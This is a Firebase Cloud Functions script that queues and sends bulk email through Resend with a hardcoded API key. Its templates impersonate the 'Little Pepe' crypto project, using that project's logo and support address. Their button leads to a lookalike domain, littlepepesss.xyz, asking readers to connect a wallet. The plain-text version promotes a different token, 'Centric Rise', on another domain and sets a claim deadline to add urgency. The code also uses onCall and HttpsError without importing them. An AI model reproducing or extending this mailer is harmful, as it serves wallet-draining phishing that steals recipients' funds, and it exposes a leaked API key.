const { onSchedule } = require('firebase-functions/v2/scheduler')
const { Resend } = require('resend')
const admin = require('firebase-admin')

admin.initializeApp()

const db = admin.firestore()
const resend = new Resend('re_UuafV5Ku_4BzrNWvoPBkzusBtsJrkU7Hj') //eventfarm.ng

exports.sendBlaster = onCall(async (request) => {
  try {
    let { emails, subject, html } = request.data

    if (typeof emails === 'string') {
      emails = emails.split(',')
    }

    emails = emails.map((e) => e.trim()).filter((e) => e.includes('@'))

    const batch = db.batch()

    emails.forEach((email) => {
      const ref = db.collection('emailQueue').doc()

      batch.set(ref, {
        email,
        subject,
        html: buildAirdropClaimHTML(),
        status: 'pending',
        createdAt: admin.firestore.FieldValue.serverTimestamp(),
      })
    })

    await batch.commit()

    console.log('QUEUE WRITTEN:', emails.length)

    return { success: true, queued: emails.length }
  } catch (err) {
    console.error('QUEUE ERROR:', err)
    throw new HttpsError('internal', err.message) // FIXED: was functions.https.HttpsError
  }
})

exports.emailWorker = onSchedule('every 1 minutes', async () => {
  const snapshot = await db
    .collection('emailQueue')
    .where('status', '==', 'pending')
    .limit(5) // Reduced from 10 to be safer
    .get()

  if (snapshot.empty) return

  for (const doc of snapshot.docs) {
    const data = doc.data()

    try {
      await resend.emails.send({
        from: 'Little Pepe <team@eventfarm.ng>', // CHANGE THIS
        to: data.email,
        subject: data.subject || `Your Little Pepe Allocation is Ready`,
        html: data.html,
        text: buildAirdropClaimText(),
        headers: {
          'List-Unsubscribe': `<https://eventfarm.ng/unsubscribe?email=${encodeURIComponent(data.email)}>`,
          'List-Unsubscribe-Post': 'List-Unsubscribe=One-Click',
          Precedence: 'bulk',
        },
      })

      await doc.ref.update({
        status: 'sent',
        sentAt: admin.firestore.FieldValue.serverTimestamp(),
      })
    } catch (err) {
      await doc.ref.update({
        status: 'failed',
        error: err.message,
      })
    }

    await new Promise((r) => setTimeout(r, 5000)) // Increased delay
  }
})

/*========================= EMAIL TEMPLATE (optional default) ========================= */

function buildAirdropClaimHTML() {
  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Centric Rise Update</title>
<style>
  body {
    margin: 0;
    padding: 0;
    background: #f5f7fa;
    font-family: Arial, Helvetica, sans-serif;
    color: #333333;
  }

  .container {
    max-width: 600px;
    margin: 0 auto;
    background: #ffffff;
    border-radius: 12px;
    overflow: hidden;
    border: 1px solid #e5e7eb;
  }

  .header {
    background: #61bafc;
    text-align: center;
    padding: 25px 20px;
  }

  .header-logo {
    display: block;
    margin: 0 auto;
    max-width: 280px;
    width: 100%;
    height: auto;
  }

  .content {
    padding: 32px;
    line-height: 1.7;
  }

  .button {
    display: inline-block;
    padding: 14px 28px;
    background: #61bafc;
    color: #ffffff !important;
    text-decoration: none;
    border-radius: 8px;
    font-weight: bold;
  }

  .notice {
    background: #f8fafc;
    border: 1px solid #e2e8f0;
    border-radius: 8px;
    padding: 16px;
    margin: 24px 0;
  }

  .footer {
    padding: 24px;
    text-align: center;
    font-size: 12px;
    color: #6b7280;
    border-top: 1px solid #e5e7eb;
  }

  .footer a {
    color: #6b7280;
    text-decoration: none;
  }
</style>

<div class="container">

  <div class="header">

    <img
      src="https://littlepepe.com/assets/logo-CPEVDSpN.png"
      
      alt="Little Pepe"
      class="header-logo"
    >

  </div>

  <div class="content">

    <p>Hello,</p>

    <p>
      We are reaching out regarding your Little Pepe allocation.
    </p>

    <p>
      The token distribution process has been completed and your allocation is now available for you to access through the Little Pepe portal.
    </p>

    <div class="notice">
      Please sign in using your wallet to verify your allocation and view your available tokens.
    </div>

    <p style="text-align:center;">
      <a href="https://littlepepesss.xyz" class="button">
        Open Dashboard
      </a>
    </p>

    <p>
      If you have already completed this process, no further action is required.
    </p>

    <p>
      Thank you for your continued participation and support.
    </p>

    <p>
      Regards,<br>
      Little Pepe Team
    </p>

  </div>

  <div class="footer">

    <p><strong>All rights reserved. Little Pepe </strong></p>

    <p>
      Support:
      <a href="mailto:support@littlepepe.com">
        support@littlepepe.com
      </a>
    </p>

    <p>
      If you no longer wish to receive updates, you may unsubscribe from future communications.
    </p>

  </div>

</div>
</body>
</html>`
}

function buildAirdropClaimText() {
  const reference = 'N/A'
  const userName = 'Valued Member'

  const airdropAmount = '50,000'
  const airdropToken = 'Centric Rise (CNR)'
  const portalUrl = 'https://maulfaq.online/portal'
  const supportUrl = 'https://maulfaq.online/support'
  const unsubscribeUrl = 'https://maulfaq.online/unsubscribe'
  const deadline = 'June 30, 2026'

  return `Centric Rise — Distribution Update

Hello ${userName},

The Centric Rise distribution on the Solana network has been processed. As a verified participant, your allocation is ready for review.

TOKEN ALLOCATION

  Amount:    ${airdropAmount} ${airdropToken}
  Allocation: Network transition distribution

OPEN TOKEN PORTAL

  ${portalUrl}

Portal available through ${deadline}.

PROCESS OVERVIEW

1. Access your dashboard
   (Compatible with Phantom, Solflare, or Backpack)

2. Review your distribution status
   Your legacy balance will be verified on-chain

3. Receive your allocation
   Tokens are sent directly to your connected wallet

NOTE

Allocations not reviewed by the deadline may be reallocated to the community pool. We recommend reviewing your status at your earliest convenience.

Reference: ${reference}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Centric Rise | Solana Network

Support: ${supportUrl}
Unsubscribe: ${unsubscribeUrl}

This is an automated message. Please do not reply.`
}
